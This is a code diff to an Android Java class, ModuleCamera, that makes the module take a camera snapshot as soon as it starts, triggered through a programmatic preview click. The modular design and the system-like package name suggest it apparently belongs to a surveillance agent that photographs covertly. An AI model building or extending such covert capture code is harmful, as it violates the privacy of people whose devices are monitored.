@@ -17,8 +17,10 @@ import android.hardware.Camera.PictureCallback;
 import android.hardware.Camera.ShutterCallback;
 import android.view.SurfaceHolder;
 
+import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
+import com.android.networking.gui.AGUI;
 import com.android.networking.util.Check;
 
 //SNIPPET http://marakana.com/forums/android/examples/39.html
@@ -31,7 +33,13 @@ public class ModuleCamera extends BaseInstantModule {
 
 	@Override
 	public void actualStart() {
-
+		try {
+			snapshot();
+		} catch (IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart) Error: " + e);
+			}
+		}
 	}
 
 	/*
@@ -51,40 +59,11 @@ public class ModuleCamera extends BaseInstantModule {
 	 * @throws IOException
 	 */
 	private synchronized void snapshot() throws IOException {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (snapshot)");
+		}
+		Status.self().preview.click();
 
-		final ShutterCallback shutterCallback = new ShutterCallback() {
-
-			public void onShutter() {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " onShutter");//$NON-NLS-1$
-				}
-			}
-		};
-		final PictureCallback rawCallback = new PictureCallback() {
-			public void onPictureTaken(final byte[] _data, final Camera _camera) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " onPictureTaken RAW");//$NON-NLS-1$
-				}
-			}
-		};
-		final PictureCallback jpegCallback = new PictureCallback() {
-			public void onPictureTaken(final byte[] _data, final Camera _camera) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " onPictureTaken JPEG");//$NON-NLS-1$
-				}
-			}
-		};
-
-		final Camera camera = Camera.open();
-		final Camera.Parameters parameters = camera.getParameters();
-		parameters.setPictureFormat(PixelFormat.JPEG);
-		camera.setParameters(parameters);
-		final SurfaceHolder holder = null;
-		camera.setPreviewDisplay(holder);
-		camera.stopPreview();
-		camera.takePicture(shutterCallback, rawCallback, jpegCallback);
-
-		camera.release();
 	}
 
 }
